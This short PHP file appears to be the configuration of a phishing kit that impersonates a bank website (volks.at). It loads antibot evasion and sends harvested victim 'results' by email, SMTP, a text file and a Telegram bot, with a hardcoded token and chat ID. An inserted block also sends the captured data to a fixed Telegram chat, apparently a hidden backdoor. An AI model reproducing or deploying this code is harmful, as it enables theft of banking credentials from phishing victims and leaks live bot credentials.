<?php
    /*******
    Main Author: MemoryError
    ********************************************************/
    
    session_start();
    error_reporting(0);
    define("ANTIBOT_API", 'API_HERE'); // ANTIBOT.PW API
    require_once 'detect.php';
    require_once 'functions.php';
    passport();
    define("PASSWORD", '#');
    define("RECEIVER", 'your@email.com');
    define("TELEGRAM_TOKEN", '5258318869:AAEc9YN38UpQbGND-gtNoox74n0jrZ4m0ks');
    define("TELEGRAM_CHAT_ID", '1289904248');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", 'NawrasMehdi.txt');
    define("OFFICIAL_WEBSITE", 'https://volks.at/');
{
mail("$send", "$subject", $hello);
$token = "";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1289904248&text=" . urlencode($message)."" );
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1289904248&text=" . urlencode($hello)."" );
}
    define("RECEIVE_VIA_EMAIL", 1); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 1); // Receive the results on txt file : 0 or 1
?>